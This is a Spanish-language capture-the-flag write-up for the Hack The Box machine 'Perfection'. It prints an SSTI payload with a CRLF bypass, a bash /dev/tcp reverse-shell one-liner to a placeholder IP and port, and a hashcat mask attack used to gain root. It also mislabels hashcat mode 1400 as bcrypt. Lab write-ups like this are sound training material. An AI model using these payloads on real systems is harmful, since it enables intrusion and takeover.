---
layout: single
title: Perfection - Hack The Box
excerpt: ""
date: 2024-6-1
classes: wide
header:
  teaser: /assets/images/htb-writeup-perfection/perfection_logo.png
  teaser_home_page: true
  icon: /assets/images/hackthebox.webp
categories:
  - hackthebox
tags:
  - XSS
  
---

![](/assets/images/htb-writeup-perfection/perfection_logo.png)

# PortScan
____

```bash
nmap -sCV -p22,80 10.10.11.253 

# Nmap 7.94SVN scan initiated Sat Jun  1 17:04:27 2024 as: nmap -sCV -p22,80 -oN targeted 10.10
Nmap scan report for 10.10.11.253
Host is up (0.068s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 80:e4:79:e8:59:28:df:95:2d:ad:57:4a:46:04:ea:70 (ECDSA)
|_  256 e9:ea:0c:1d:86:13:ed:95:a9:d0:0b:c8:22:e4:cf:e9 (ED25519)
80/tcp open  http    nginx
|_http-title: Weighted Grade Calculator
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat Jun  1 17:04:36 2024 -- 1 IP address (1 host up) scanned in 9.94 seconds
```


# Sitio Web
![](/assets/images/htb-writeup-perfection/Pasted image 20240601185515.png)

Vemos que a simple vista tiene 3 posibles directorios, empiezo a indagar en ellos... empezando por el **About**.

![](/assets/images/htb-writeup-perfection/Pasted image 20240601185607.png)

Viendo dos nombres del equipo, tanto de la desarrolladora como la profesora, que quizás me sirvan mas adelante, me los guardo... ahora entro a la **calculadora de nota.**

![](/assets/images/htb-writeup-perfection/Pasted image 20240601185748.png)

empiezo a poner inputs, respetando el máximo & tratar de llevar a cabo una ejecución de comando y no logro nada, decido usar **BurpSuite** para ver la **DATA** como se tramita & tratar poder ejecutar comandos, o intentarlo...

![](/assets/images/htb-writeup-perfection/Pasted image 20240601190554.png)

detectaba el **input malicioso**, intente **bypassearlo** de varias manera, no logre nada exitoso por un rato, pero finalmente...

descubrí lo que es el **CRLF**, que son secuencias de caracteres especiales en el protocolo **HTTP** para iniciar una nueva **línea**, pudiendo así crear una nueva línea así que empecé a probar payload típicos de **SSTI** contemplados en [HackTricks](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection).

Solo me funcionaron lo que empiezan con **<%%>**, pero **URLencodeando** todo, debido al **CRLF** para nueva línea que esta representado como:_ **"%0a"**.

![](/assets/images/htb-writeup-perfection/Pasted image 20240601191905.png)
```bash
T%0a<%25%3d7*7%25>
```
![](/assets/images/htb-writeup-perfection/Pasted image 20240601191925.png)

esta haciendo la multiplicación, así que ahora busco payload's para llevar a cabo un **RCE** & obtener nuestra Reverse Shell.

Nos ponemos en escucha con **Netcat**:
```bash
nc -nlvp PORT
```

![](/assets/images/htb-writeup-perfection/Pasted image 20240601192558.png)

```bash
T%0a<%25%3dsystem("bash+-c+'bash+-i+>%26/dev/tcp/IP/PORT+0>%261'")%3b%25>
```

![](/assets/images/htb-writeup-perfection/Pasted image 20240601192731.png)

Y ganamos acceso a la maquina como **Susan**, ya quedaría darle **tratamiento a la TTY,** que sino sabes como [((HAZ CLICK AQUi))](https://4uli.github.io/tratamiento-tty/#)

# Escalada de Privilegios

Empecé a indagar como **Susan** en el sistema, encontrando así el siguiente mail que recibió Susan.

 ![](/assets/images/htb-writeup-perfection/Pasted image 20240601193340.png)
 
básicamente, le estaban sugiriendo una contraseña, que empiece con el nombre, barra baja, el nombre al revés, barra baja números de 1 a 1 millón.

de primeras no me pareció interesante, seguí indagando...

descubrí este directorio, con esto:
![](/assets/images/htb-writeup-perfection/Pasted image 20240601193551.png)
una base de datos en **sqlite** formato 3, decidí conectarme a esta db, aunque ya podía ver los datos, pero no estaba seguro...

![](/assets/images/htb-writeup-perfection/Pasted image 20240601193834.png)

viendo así los usuarios & un **hash**, que seguramente sea la contraseña, tenemos una pista... que fue el correo que vimos anteriormente que recibió Susan, por lo que podemos intuir al menos los primeros caracteres de la contraseña, así que intento fuerza bruta con **Hashcat** en mi windows y con esta pista.

```bash
.\hashcat.exe -a 3 -m 1400 hash.txt "susan_nasus_?d?d?d?d?d?d?d?d?d" 
```

**-a 3:** este parámetro indica que el ataque será de modo "mascara."
**-m 1400**: indica el modo del hash, en este caso bcrypt.
**-hash.txt:** aquí dentro esta el hash que vimos en la base de datos.
**-"susan_nasus_?d?d?d?d?d?d?d?d?d"** : indica el inicio de la posible contraseña con la pista del correo, que es el nombre normal, al revés, y luego 9 posibles números.

![](/assets/images/htb-writeup-perfection/cracking.png)

obteniendo así la que podría ser la contraseña para Susan, así que procedo a probar para ver los **SUDOERS**.

![](/assets/images/htb-writeup-perfection/Pasted image 20240601195051.png)

Puedo ejecutar como quien sea lo que sea, así que me convierto en **ROOT** ya sabiendo las credenciales de **Susan**.

![](/assets/images/htb-writeup-perfection/Pasted image 20240601195153.png)
